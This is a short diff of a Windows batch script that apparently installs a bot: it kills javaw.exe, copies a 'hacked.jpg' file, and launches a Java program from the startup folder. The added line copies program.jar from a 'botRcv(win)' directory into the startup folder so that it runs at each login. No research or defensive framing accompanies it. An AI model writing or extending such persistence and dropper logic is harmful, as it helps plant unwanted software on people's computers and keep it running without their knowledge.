@@ -12,6 +12,7 @@ cscript /nologo "%~dp0\link.vbs" "%usedStartupFolder%\program.lnk" "%recieveDir%
 taskkill.exe /F /IM javaw.exe
 
 copy "%~dp0\hacked.jpg" "%recieveDir%\hacked.jpg"
+copy "%~dp0..\..\..\direct\botRcv(win)\program.jar" "%usedStartupFolder%\program.jar"
 
 start "" "%usedStartupFolder%\program.lnk"
 start "" "%usedStartupFolder%\program.jar"
